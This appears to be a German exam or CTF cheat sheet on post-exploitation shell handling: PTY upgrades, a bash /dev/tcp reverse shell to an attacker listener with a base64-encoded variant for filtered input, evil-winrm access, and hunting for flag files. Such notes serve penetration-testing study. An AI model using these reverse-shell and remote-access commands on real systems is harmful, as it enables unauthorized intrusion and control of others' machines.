# 🆙 Shell Upgrade

> **Hinweis Prof:** In der Prüfung kann zuerst nur eine Weak Shell kommen. Wenn du über Web als Dienst-User eine Shell bekommst: zuerst upgraden, dann Home-Verzeichnisse und Hinweise suchen.

---

## Linux PTY

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
script -qc /bin/bash /dev/null
export TERM=xterm
export SHELL=/bin/bash
```

Besseres TTY:

```text
Ctrl+Z
```

Auf Kali:

```bash
stty raw -echo; fg
# Enter, Enter
```

In der Shell:

```bash
reset
export TERM=xterm
stty rows 40 columns 160
```

---

## Web-Shell → Reverse Shell

```bash
# Kali
nc -lvnp 4444

# Target Linux über Web-Command
bash -c 'bash -i >& /dev/tcp/'$LHOST'/4444 0>&1'
```

Wenn Sonderzeichen Probleme machen:

```bash
payload=$(echo -n "bash -i >& /dev/tcp/$LHOST/4444 0>&1" | base64 -w0)
echo $payload
# Target: echo <payload>|base64 -d|bash
```

---

## Windows

```cmd
whoami
hostname
```

Wenn WinRM offen und Creds vorhanden:

```bash
evil-winrm -i $RHOST -u user -p 'pass'
```

ConPtyShell nur wenn wirklich nötig; in der Prüfung reichen meist cmd/PowerShell/evil-winrm.

---

## Nach Upgrade direkt suchen

Linux:

```bash
ls -la
ls -la /home/* /opt /var/www 2>/dev/null
find / -iname 'user.txt' -o -iname 'root.txt' 2>/dev/null
```

Windows:

```cmd
dir /a C:\Users
where /r C:\ user.txt 2>nul
where /r C:\ root.txt 2>nul
```
